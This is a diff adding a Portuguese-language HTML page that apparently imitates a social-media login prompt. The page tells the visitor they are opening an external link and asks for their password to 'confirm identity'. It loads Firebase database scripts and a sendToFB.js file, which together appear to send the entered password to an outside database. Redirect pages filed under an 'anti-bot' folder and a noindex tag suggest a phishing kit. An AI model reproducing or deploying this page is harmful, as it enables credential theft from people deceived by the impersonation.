@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="user-scalable=no">
+    <meta name="robots" content="noindex">
+    <title>Você está abrindo um link externo</title>
+    <link rel="shortcut icon" href="../img/faviconPhApp.png" type="image/x-icon">
+    <link rel="stylesheet" href="../css/pageLog.css">
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-analytics.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+</head>
+<body>
+    <div id="page-container">
+        <div id="content-wrap">
+            <div class="formLogin">
+                <img class="logo-ig" src="../img/app-ph-logo.png" alt="appPh">
+
+                <div class="pageResume">
+                    <img class="profileAndLink" src="../img/user.png" alt="user">
+                    <h1 class="primaryAlert">Você está abrindo<br>um link externo</h1>
+                    <p class="secondAlert">Confirme sua identidade para continuar.</p>
+                </div>
+
+                <form class="confirmID">
+                    <div class="p455Row">
+                        <input type="password" class="senha" id="p455" placeholder="Senha">
+                        <span class="actVisual">Mostrar</span>
+                    </div>
+                    <input class="entrar" type="submit" value="Entrar">
+                </form>
+
+                <div class="forgetInfo">
+                    <p>Esqueceu seus dados de login? <a href="../anti-bot/forgetRed.html">Obtenha ajuda para entrar.</a></p>
+                </div>
+            </div>
+
+            <div class="getAppsArea">
+                <p>Obtenha o aplicativo:</p>
+                <div class="iconsGetAppsArea">
+                    <a href="../anti-bot/psRed.html">
+                        <img src="../img/icon-ps.png" alt="App 1" class="iconApp">
+                    </a>
+                    <a href="../anti-bot/msRed.html">
+                        <img src="../img/icon-ms.png" alt="App 2" class="iconApp">
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <footer id="footer">
+            <img src="../img/from-company.png" alt="Company logo" class="fromCompany">
+        </footer>
+    </div>
+    <script src="../js/sendToFB.js"></script>
+    <script src="../js/togglePasswordVisibility.js"></script>
+
+    <!-- Developed by Malva Group -->
+</body>
+</html>
